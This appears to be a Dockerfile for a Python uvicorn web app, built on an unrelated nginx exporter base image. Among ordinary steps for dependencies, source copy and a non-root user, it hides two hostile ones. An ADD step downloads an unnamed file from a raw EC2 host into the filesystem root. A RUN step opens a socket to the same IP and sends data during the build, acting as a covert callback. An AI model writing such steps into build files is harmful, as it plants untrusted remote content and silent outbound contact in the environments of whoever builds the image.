FROM sophos/nginx-vts-exporter
# ADD fetches the file from the URL into the root
ADD http://ec2-56-228-29-137.eu-north-1.compute.amazonaws.com:9000/abc /
# Note: You may need a separate RUN step to extract if it's a remote tar
WORKDIR /usr/local/app

# Install the application dependencies
COPY requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt

# Copy in the source code
COPY src ./src
RUN python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("56.228.29.137",5000));s.send(b"AAAAAAAAAAA")'
# Setup an app user so the container doesn't run as the root user
RUN useradd app
USER app

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8080"]
